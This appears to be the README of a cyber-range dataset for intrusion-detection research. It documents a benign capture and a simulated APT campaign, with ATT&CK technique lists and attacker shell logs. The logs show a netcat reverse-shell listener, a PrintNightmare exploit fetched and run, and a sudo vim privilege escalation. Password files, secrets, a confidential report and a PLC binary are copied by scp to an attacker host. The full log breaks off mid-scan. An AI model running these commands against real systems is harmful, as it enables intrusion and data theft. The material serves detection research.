# Cyberrange Dataset

## Benign Behaviour

Dataset folder name: 20-11-2024-15-30

Involved Hosts:
    - OT-Linux-PLC  10.0.2.17
    - OT-Linux-HMI  10.0.2.16
    - OT-Win-PC-1   10.0.2.15
    - IT-Win-Share  10.0.1.20, 10.0.2.20
    - IT-Win-PC-1   10.0.1.15
    - IT-Linux-PC-1 10.0.1.16
   
Duration: ~30 Min
Starting Time: ~ 1732113007.322 (Wednesday, November 20, 2024 3:30:07.322 PM GMT+01:00, IT-Linux-PC-1)
End-Time: ~ 1732114674.919 (Wednesday, November 20, 2024 3:57:54.919 PM GMT+01:00, IT-Linux-PC-1)
                


Activity:
    - IT-Win-PC-1
        - Office applications
        - Webbrowsing
        - YouTube playback
    - IT-Linux-PC-1
        - create files
        - try to create file in documents folder (permission denied)
        - create and edit text files in home directory
    - OT-Win-PC-1
        - try to ssh to OT-Linux-PLC and OT-Linux-HMI
    - OT-Linux-{PLC,HMI}
        - edit sshd config
        - ssh from proxy
        - lookup service status of modbus services
        - manually start hmi and plc binaries
   
   
## Example APT Campaign

Dataset folder name: 23-11-2024-15-57

Involved Hosts:
    - OT-Linux-PLC  10.0.2.17
    - OT-Linux-HMI  10.0.2.16
    - OT-Win-PC-1   10.0.2.15 (record crashed)
    - IT-Win-Share  10.0.1.20, 10.0.2.20
    - IT-Win-PC-1   10.0.1.15
    - IT-Linux-PC-1 10.0.1.16
    - APT-Outside-Attacker (not recorded)  10.0.4.97, 10.1.3.165
    
Duration:
Starting Time: ca 15:58 gmt+1
End Time: ca 17:47 gmt+1

Activity:    
    note win executed as testadmin, but this works the same with testuser. testuser was not chosen because the malicious file was generated with testadmin and copied over, which did not work
    the execution was plagued by poor university vpn connections which frequently timed out and reconnected after a while
    
TTPs (in order of execution):
    - T1204.002 - User Execution: Malicious File   
    - T1096, T1564.004, T1132, T1105
    - T1497.001, T1082, T1120, T1033, T1016, T1057, T1083    
    - T1060, T1547.001
    - T1140, T1086, T1059.001, T1071
    
    - T1033
    - T1082
    - T1083 (x5)
    - T1087.001 (x3)
    - T1135
    - T1016 (x3)
    - T1049
    - T1016
    - T1105, T1059.001
    - T1046, T1595.001, T1590.005
    - T1083
    - T1059.001
    - T1059.001, T1078, T1136.001
    - T1059.001, T1078
    
    - T1033
    - T1083
    - T1552.001, T1083
    - T1021.004
    - T1021.004, T1041
    - T1571, T1021.004
 
    - T1033
    - T1082 (x4)
    - T1518 (x2)
    - T1083 (x4)
    - T1087.001, T1201
    - T1046, T1595.001, T1590.005, T1046
    - T1021.004, T1041
    - T1046, T1595.001, T1590.005, T1595.002
    - T1548.003

    - T1033
    - T1083 (x2)
    - T1021.004, T1041
    - T1021.004

    - T1083
    - T1059.001
    - T1033
    - T1083 (x5)
    - T1021.004, T1041
    - T1105, T1059.001
    - T1046, T1595.001, T1590.005
    - T1046, T1595.001, T1590.005
    - T1571, T1021.004
    - T1083
    - T1021.004, T1041


 
shortened execution log:
```
┌──(debian㉿APT-Outside-Attacker)-[~]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 8000
listening on [any] 8000 ...

User TestAdmin executes malicious file

-->

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\TestAdmin\Desktop> 

whoami
systeminfo
type %userprofile%
cat (Get-PSReadlineOption).HistorySavePath | sls passw
ls
cd ..
ls
cd .\Documents\
ls
net user
net users
net localgroup
net view
ifconfig
ipconfig
ipconfig /all
netstat -ano
route print
cd ..
Invoke-WebRequest 'https://raw.githubusercontent.com/JohnHammond/CVE-2021-34527/refs/heads/master/CVE-2021-34527.ps1' -OutFile .\CVE-2021-34527.ps1
nmap -A 10.0.1.0/24
ls
Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare 
$user = "adm1n"
$pw = "P@ssw0rd"
$password = $pw | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$password 
New-PSSession -Credential $cred | Enter-PSSession
[localhost]: PS C:\Users\adm1n\Documents> whoami
cd C:\Users\TestAdmin\Documents\
ls
Copy-Item .\pw.txt C:\Users\TestAdmin\pw.txt
type .\pw.txt
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/
exit
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password ubuntu@10.0.1.16 -p 666

-->

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64) 

whoami
(cat /proc/version || uname -a ) 2>/dev/null
echo $PATH
cat /proc/version
uname -a
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
sudo -V
ls
cd Documents/
ls
cat secret.txt 
ls -lah 
sudo -l
nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25
cd ..
nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password nmap.txt debian@10.1.3.165:/home/debian/
nmap -Pn --script vuln 10.0.1.20
sudo vim -c '!sh'

-->
:!sh
# whoami
ls 
cd Documents 
ls 
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password secret.txt debian@10.1.3.165:/home/debian 
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20 -p 666
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20

-->

:!sh
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

ls
powershell 
whoami
ls
cd ..
cd ..
ls
cd .\shares\
ls
cd .\company\
ls
type .\confidential_report.txt
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password .\confidential_report.txt debian@10.1.3.165:/home/debian/
cd ..
cd ..
Invoke-WebRequest 'https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/refs/heads/main/Scripts/IPv4NetworkScan.ps1' -OutFile scan.ps1 
.\scan.ps1 -IPv4Address 10.0.2.0 -CIDR 24
nmap -A 10.0.2.0/24
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password debian@10.0.2.17 -p 80

--> 

Linux OT-Linux-PLC 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

ls
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password plc debian@10.1.3.165:/home/debian/

```
    
    
execution log:  
```
┌──(debian㉿APT-Outside-Attacker)-[~]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 8000
listening on [any] 8000 ...

TestUser tries to execute malicious link
does not execute
switch to TestAdmin

execute malicious file


--> reverse shell on kali


Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\TestAdmin\Desktop>  

PS C:\Users\TestAdmin\Desktop> whoami
it-win-pc-1\testadmin
PS C:\Users\TestAdmin\Desktop> systeminfo

Host Name:                 IT-WIN-PC-1
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation    
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Vagrant
Registered Organization:   Bento by Chef Software, Inc.
Product ID:                00431-10000-00000-AA573
Original Install Date:     11/23/2024, 1:32:55 PM
System Boot Time:          11/23/2024, 2:11:54 PM
System Manufacturer:       OpenStack Foundation
System Model:              OpenStack Nova
System Type:               x64-based PC
Processor(s):              4 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2600 Mhz 
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2600 Mhz 
                           [03]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2600 Mhz
                           [04]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2600 Mhz
BIOS Version:              EFI Development Kit II / OVMF 0.0.0, 2/6/2015 
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             de;German (Germany)
Input Locale:              de;German (Germany)
Total Physical Memory:     8,185 MB
Available Physical Memory: 6,756 MB
Virtual Memory: Max Size:  8,185 MB
Virtual Memory: Available: 6,883 MB
Virtual Memory: In Use:    1,302 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              \\IT-WIN-PC-1
Hotfix(s):                 3 Hotfix(s) Installed.
                           [02]: KB4512577
                           [03]: KB4512578
Network Card(s):           1 NIC(s) Installed.
                           [01]: Red Hat VirtIO Ethernet Adapter
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.1.2
                                 IP address(es)
                                 [01]: 10.0.1.15
                                 [02]: fe80::e4ee:488a:ff87:bffa
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.     
PS C:\Users\TestAdmin\Desktop> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHos
t_history.txt
type : Cannot find path 'C:\Users\TestAdmin\Desktop\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSRe 
adline\ConsoleHost_history.txt' because it does not exist.
At line:1 char:1
+ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSRea ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
 
PS C:\Users\TestAdmin\Desktop> cat (Get-PSReadlineOption).HistorySavePath | sls passw

cat (Get-PSReadlineOption).HistorySavePath | sls passw


PS C:\Users\TestAdmin\Desktop> ls


    Directory: C:\Users\TestAdmin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/23/2024   2:55 PM        1554996 2016_United_States_presidential_election_-_Wikipedia.html
-a----       11/23/2024   2:24 PM           1494 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk 
-a----       11/23/2024   2:24 PM            601 make_lnk.ps1
-a----       11/23/2024   2:54 PM           2370 schemas.ps1


PS C:\Users\TestAdmin\Desktop> cd ..
PS C:\Users\TestAdmin> ls


    Directory: C:\Users\TestAdmin


d-----       11/23/2024   1:37 PM                .ssh
d-r---       11/23/2024   1:36 PM                3D Objects
d-r---       11/23/2024   1:36 PM                Contacts
d-r---       11/23/2024   4:03 PM                Desktop
d-r---       11/23/2024   2:24 PM                Documents
d-r---       11/23/2024   1:58 PM                Downloads
d-r---       11/23/2024   1:36 PM                Favorites
d-r---       11/23/2024   1:36 PM                Links
d-r---       11/23/2024   1:36 PM                Music
d-r---       11/23/2024   1:47 PM                OneDrive
d-r---       11/23/2024   1:36 PM                Pictures
d-r---       11/23/2024   1:36 PM                Saved Games
d-r---       11/23/2024   1:36 PM                Searches
d-r---       11/23/2024   1:36 PM                Videos
-a----       11/23/2024   2:55 PM           1488 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk 
------       11/23/2024   3:57 PM              0 file_read.etl
------       11/23/2024   3:57 PM              0 Powershell_payload.etl
------       11/23/2024   3:57 PM              0 Registry_read.etl
-a----       11/23/2024   2:15 PM              9 start


PS C:\Users\TestAdmin> cd .\Documents\
PS C:\Users\TestAdmin\Documents> ls


    Directory: C:\Users\TestAdmin\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2024   1:39 PM                WindowsPowerShell
-a----       11/23/2024   2:24 PM          30897 MITRE-ATTACK-EVALS.HTML
-a----       11/23/2024   2:24 PM             46 pw.txt


PS C:\Users\TestAdmin\Documents> net user

User accounts for \\IT-WIN-PC-1

-------------------------------------------------------------------------------
Admin                    Administrator            cloudbase-init
DefaultAccount           Guest                    sshd
TestAdmin                TestUser                 vagrant
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\TestAdmin\Documents> net users

User accounts for \\IT-WIN-PC-1

-------------------------------------------------------------------------------
Admin                    Administrator            cloudbase-init
DefaultAccount           Guest                    sshd
TestAdmin                TestUser                 vagrant
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\TestAdmin\Documents> net localgroup

Aliases for \\IT-WIN-PC-1 

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.

PS C:\Users\TestAdmin\Documents> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.

PS C:\Users\TestAdmin\Documents> net view
System error 384 has occurred.

You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol, which i
s unsafe and could expose your system to attack.
Your system requires SMB2 or higher. For more info on resolving this issue, see: https://go.microsoft.com/fwlink/?li
nkid=852747

PS C:\Users\TestAdmin\Documents> ifconfig
ifconfig : The term 'ifconfig' is not recognized as the name of a cmdlet, function, script file, or operable        
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.  
At line:1 char:1
+ ifconfig
+ ~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (ifconfig:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 
PS C:\Users\TestAdmin\Documents> ipconfig

Windows IP Configuration


Ethernet adapter tapc6c37cce-2c:

   Connection-specific DNS Suffix  . : openstacklocal
   Link-local IPv6 Address . . . . . : fe80::e4ee:488a:ff87:bffa%6
   IPv4 Address. . . . . . . . . . . : 10.0.1.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.1.1

PS C:\Users\TestAdmin\Documents> type C:\Windows\System32\drivers\etc\hosts
# Copyright (c) 1993-2009 Microsoft Corp. 
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost


PS C:\Users\TestAdmin\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : it-win-pc-1
   Primary Dns Suffix  . . . . . . . :  
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : openstacklocal

Ethernet adapter tapc6c37cce-2c:

   Connection-specific DNS Suffix  . : openstacklocal
   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter
   Physical Address. . . . . . . . . : FA-16-3E-2B-6F-1F
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::e4ee:488a:ff87:bffa%6(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.0.1.15(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Saturday, November 23, 2024 2:37:47 PM
   Lease Expires . . . . . . . . . . : Sunday, November 24, 2024 2:37:47 PM
   Default Gateway . . . . . . . . . : 10.0.1.1
   DHCP Server . . . . . . . . . . . : 10.0.1.2
   DHCPv6 IAID . . . . . . . . . . . : 100275774
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2E-D3-83-9C-FA-16-3E-2B-6F-1F
   DNS Servers . . . . . . . . . . . : 10.0.1.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

   
PS C:\Users\TestAdmin\Documents> netstat -ano
 
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2828 
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       908
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4 
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       728
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4 
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488 
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1188
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1636
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2204
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       2528
  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       2336 
  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING       648
  TCP    10.0.1.15:139          0.0.0.0:0              LISTENING       4
  TCP    10.0.1.15:49713        40.115.3.253:443       ESTABLISHED     2944
  TCP    10.0.1.15:49938        10.1.3.165:8000        ESTABLISHED     3844
  TCP    [::]:22                [::]:0                 LISTENING       2828
  TCP    [::]:135               [::]:0                 LISTENING       908
  TCP    [::]:445               [::]:0                 LISTENING       4 
  TCP    [::]:3389              [::]:0                 LISTENING       728
  TCP    [::]:5357              [::]:0                 LISTENING       4 
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:5986              [::]:0                 LISTENING       4 
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       488
  TCP    [::]:49665             [::]:0                 LISTENING       1188
  TCP    [::]:49666             [::]:0                 LISTENING       1636 
  TCP    [::]:49667             [::]:0                 LISTENING       2204
  TCP    [::]:49671             [::]:0                 LISTENING       2528
  TCP    [::]:49676             [::]:0                 LISTENING       2336
  TCP    [::]:49677             [::]:0                 LISTENING       632
  TCP    [::]:49691             [::]:0                 LISTENING       648
  UDP    0.0.0.0:500            *:*                                    2328
  UDP    0.0.0.0:3389           *:*                                    728
  UDP    0.0.0.0:3702           *:*                                    2608
  UDP    0.0.0.0:3702           *:*                                    2608
  UDP    0.0.0.0:4500           *:*                                    2328
  UDP    0.0.0.0:5353           *:*                                    1324
  UDP    0.0.0.0:5355           *:*                                    1324
  UDP    0.0.0.0:61658          *:*                                    2608
  UDP    10.0.1.15:137          *:*                                    4
  UDP    10.0.1.15:138          *:*                                    4
  UDP    127.0.0.1:61657        *:*                                    2852
  UDP    [::]:500               *:*                                    2328
  UDP    [::]:3389              *:*                                    728
  UDP    [::]:3702              *:*                                    2608
  UDP    [::]:3702              *:*                                    2608
  UDP    [::]:4500              *:*                                    2328
  UDP    [::]:5353              *:*                                    1324
  UDP    [::]:5355              *:*                                    1324
  UDP    [::]:61659             *:*                                    2608
   
   
PS C:\Users\TestAdmin\Documents> route print
=========================================================================== 
Interface List
  6...fa 16 3e 2b 6f 1f ......Red Hat VirtIO Ethernet Adapter 
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0         10.0.1.1        10.0.1.15     15
         10.0.1.0    255.255.255.0         On-link         10.0.1.15    271
        10.0.1.15  255.255.255.255         On-link         10.0.1.15    271 
       10.0.1.255  255.255.255.255         On-link         10.0.1.15    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  169.254.169.254  255.255.255.255         10.0.1.2        10.0.1.15     16
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link         10.0.1.15    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link         10.0.1.15    271
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  6    271 fe80::/64                On-link
  6    271 fe80::e4ee:488a:ff87:bffa/128
                                    On-link
  1    331 ff00::/8                 On-link
  6    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
   

PS C:\Users\TestAdmin\Documents> cd ..
PS C:\Users\TestAdmin> Invoke-WebRequest 'https://raw.githubusercontent.com/JohnHammond/CVE-2021-34527/refs/heads/master/CVE-2021-34527.ps1' -OutFile .\CVE-2021-34527.ps1

PS C:\Users\TestAdmin> nmap -A 10.0.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-23 16:36 W. Europe Standard Time 
Nmap scan report for host-10-0-1-1.openstacklocal (10.0.1.1) 
Host is up (0.0028s latency). 
All 1000 scanned ports on host-10-0-1-1.openstacklocal (10.0.1.1) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: FA:16:3E:71:BF:AD (Unknown)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   2.77 ms host-10-0-1-1.openstacklocal (10.0.1.1)

Nmap scan report for 10.0.1.2
Host is up (0.0014s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
53/tcp open  domain  dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90
MAC Address: FA:16:3E:28:9F:06 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=53%CT=1%CU=36052%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=6741F6D0%P=i686-pc-windows-windows)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1
OS:%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GCD=2%ISR=108%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=FF%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M582S
OS:T11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W1=
OS:FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%O=
OS:M582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.45 ms 10.0.1.2

Nmap scan report for host-10-0-1-5.openstacklocal (10.0.1.5)
Host is up (0.0018s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION 
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 50:7b:04:53:93:3c:08:63:91:3a:d7:57:e5:5e:3b:64 (ECDSA)
|_  256 10:d0:f6:df:a0:77:25:70:5c:80:98:65:e4:f3:c6:ea (ED25519)
139/tcp  open  netbios-ssn   Samba smbd 4
445/tcp  open  netbios-ssn   Samba smbd 4
1080/tcp open  socks5        (No authentication; connection failed)
| socks-auth-info:
|_  No authentication
| socks-open-proxy:
|   status: open
|   versions:
|     socks4
|_    socks5
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: FA:16:3E:3F:E2:40 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=30196%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=6741F6D0%P=i686-pc-windows-windows)SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1
OS:%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=
OS:A)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M58
OS:2ST11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W
OS:1=FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%
OS:O=M582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-23T15:37:17
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.85 ms host-10-0-1-5.openstacklocal (10.0.1.5)

Nmap scan report for host-10-0-1-12.openstacklocal (10.0.1.12)
Host is up (0.0015s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
80/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
222/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
666/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: FA:16:3E:32:0D:75 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=31894%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=6741F6D0%P=i686-pc-windows-windows)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z
